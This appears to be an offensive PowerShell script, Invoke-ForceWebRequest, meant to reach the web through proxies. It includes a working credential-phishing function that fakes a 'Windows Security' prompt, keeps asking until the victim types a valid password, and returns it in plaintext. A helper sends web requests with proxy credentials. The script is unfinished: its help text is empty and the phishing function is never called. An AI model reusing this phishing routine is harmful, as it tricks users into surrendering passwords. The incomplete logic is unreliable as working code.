#requires -version 2
function Invoke-ForceWebRequest {
    <#

    .SYNOPSIS

    .PARAMETER Iterate

    .OUTPUTS
    
    .EXAMPLE

    #>
    [CmdletBinding()]
    [OutputType([psobject])]
    param(
        [Parameter(Mandatory=$true)]
        [String]
        $URL,

        [Parameter(Mandatory=$true)]
        [String]
        $DummyURL,

        [Parameter(Mandatory=$true)]
        [String]
        $DummyString = 'dummystring'
    )
    begin {
        # Modified version of 'Invoke-LoginPrompt' by @enigma0x3
        # https://github.com/enigma0x3/Invoke-LoginPrompt/blob/master/Invoke-LoginPrompt.ps1
        function Invoke-LoginPrompt{
            do {
                $cred = $Host.ui.PromptForCredential("Windows Security", "Invalid Credentials, Please try again", "$env:userdomain\$env:username","")
                $username = "$env:username"
                $domain = "$env:userdomain"
                $full = "$domain" + "\" + "$username"
                $password = $cred.GetNetworkCredential().password
                Add-Type -assemblyname System.DirectoryServices.AccountManagement
                $DS = New-Object System.DirectoryServices.AccountManagement.PrincipalContext([System.DirectoryServices.AccountManagement.ContextType]::Machine)
            } while($DS.ValidateCredentials("$full", "$password") -ne $True);
            
            $output = $cred.GetNetworkCredential() | select-object UserName, Domain, Password
            $output
        }

        # Invoke-BasicWebRequest by @daniel0x00
        #
        function Invoke-BasicWebRequest {
            [CmdletBinding()]
            [OutputType([psobject])]
            param(
                [Parameter(Mandatory=$true,
                        ValueFromPipelineByPropertyName=$true,
                        Position=0)]
                [ValidateNotNullOrEmpty()]
                [String]
                $URL,

                [Parameter(Mandatory=$false)]
                [String]
                $UserAgent = 'Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; AS; rv:11.0) like Gecko',

                [Parameter(Mandatory=$false)]
                [String]
                $ProxyURL,

                [Parameter(Mandatory=$false)]
                [String]
                $ProxyUser,

                [Parameter(Mandatory=$false)]
                [String]
                $ProxyPassword,

                [Parameter(Mandatory=$false)]
                [Switch]
                $ProxyDefaultCredentials
            )

            # Ensure URL contains a 'http' protocol:
            if (-not ($URL -match "http")) { $URL = 'http://'+$URL }

            $request = [System.Net.WebRequest]::Create($URL)
            $request.UserAgent = $UserAgent
            $request.Accept = "*/*"

            # Proxy settings
            if ($ProxyURL) { 
                $proxy = New-Object System.Net.WebProxy
                $proxy.Address = $ProxyURL
                $request.Proxy = $proxy

                if ($ProxyUser) {
                    if ($ProxyDefaultCredentials) {
                        $request.UseDefaultCredentials = $true
                        Write-Verbose "Established proxy URL to $ProxyURL and using default credentials"
                    }
                    else {
                        $ProxyPassword = ConvertTo-SecureString $ProxyPassword -AsPlainText -Force;
                        $proxy.Credentials = New-Object System.Management.Automation.PSCredential ($ProxyUser, $ProxyPassword);

                        Write-Verbose "Established proxy URL to $ProxyURL and using $ProxyUser credentials"
                    }
                }
                else { Write-Verbose "Established proxy URL to $ProxyURL" }
            }

            try {
                Write-Verbose "Trying to get $URL"

                $response               = $request.GetResponse()
                $response_stream        = $response.GetResponseStream();
                $response_stream_reader = New-Object System.IO.StreamReader $response_stream;
                $response_text          = $response_stream_reader.ReadToEnd(); 
                $response_status_code   = ($response.StatusCode) -as [int]

                $out = New-Object -TypeName PSObject
                $out | Add-Member -MemberType NoteProperty -Name StatusCode -Value $response_status_code
                $out | Add-Member -MemberType NoteProperty -Name Content -Value $response_text
                $out
            }
            catch {
                $response = $_.Exception.InnerException
                $response_status_code = [int](([regex]::Match($_.Exception.InnerException,"\((?<status_code>\d{3})\)")).groups["status_code"].value)

                $out = New-Object -TypeName PSObject
                $out | Add-Member -MemberType NoteProperty -Name StatusCode -Value $response_status_code
                $out | Add-Member -MemberType NoteProperty -Name Content -Value $response
                $out
            }
        }
    }
    process {
        # Ensure URLs contains at least an 'http' protocol:
        if (-not ($URL -match "http")) { $URL = 'http://'+$URL }
        if (-not ($DummyURL -match "http")) { $DummyURL = 'http://'+$DummyURL }

        # 1: trying to download dummystring with classic webrequest
        $request = Invoke-BasicWebRequest $DummyURL
        if ($request | select -first 1 | % { $_.content -match $DummyString }) { return }

    }
    end { $request }
}